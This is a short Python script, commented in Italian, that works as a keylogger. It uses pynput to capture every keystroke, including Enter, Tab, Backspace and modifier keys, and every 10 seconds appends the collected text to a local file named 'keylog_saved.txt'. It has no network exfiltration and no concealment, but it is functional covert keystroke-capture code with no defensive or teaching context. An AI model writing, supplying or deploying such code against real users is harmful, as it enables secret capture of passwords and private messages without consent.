from pynput import keyboard
import threading

# Nome del file in cui salvare i dati dei tasti premuti
log_file = "keylog_saved.txt"

# Variabile globale per salvare temporaneamente i tasti premuti
text = ""
previous_text = ""

# Intervallo di tempo in secondi per salvare i dati nel file
time_interval = 10

# Funzione per salvare i dati nel file
def save_to_file():
    global text, previous_text
    try:
        if text:  # Salva solo se c'è contenuto da scrivere
            # Se il testo corrente è diverso dal testo precedente, significa che ci sono nuovi dati
            if text != previous_text:
                # Controlla se il testo termina con lettere consecutive
                if text.isalpha():
                    text_to_save = text + "-"
                else:
                    text_to_save = text
                # Apriamo il file in modalità append per aggiungere i dati
                with open(log_file, "a") as f:
                    f.write(text_to_save + "\n")  # Aggiunge un ritorno a capo dopo il testo salvato
                # Aggiorna il testo precedente
                previous_text = text
        # Impostiamo un timer per eseguire periodicamente questa funzione
        timer = threading.Timer(time_interval, save_to_file)
        timer.start()
    except Exception as e:
        print(f"Errore durante il salvataggio: {e}")

# Funzione per gestire i tasti premuti
def on_press(key):
    global text
    try:
        # Gestiamo tasti specifici come Invio, Tab e Spazio
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.backspace:
            if len(text) > 0:
                text = text[:-1]
        else:
            # Convertiamo il tasto in stringa e lo aggiungiamo al testo
            text += key.char
    except AttributeError:
        # Per tasti speciali come Shift, Ctrl, ecc.
        text += f"[{key}]"

# Listener della tastiera
with keyboard.Listener(on_press=on_press) as listener:
    # Iniziamo il salvataggio periodico dei dati nel file
    save_to_file()
    listener.join()



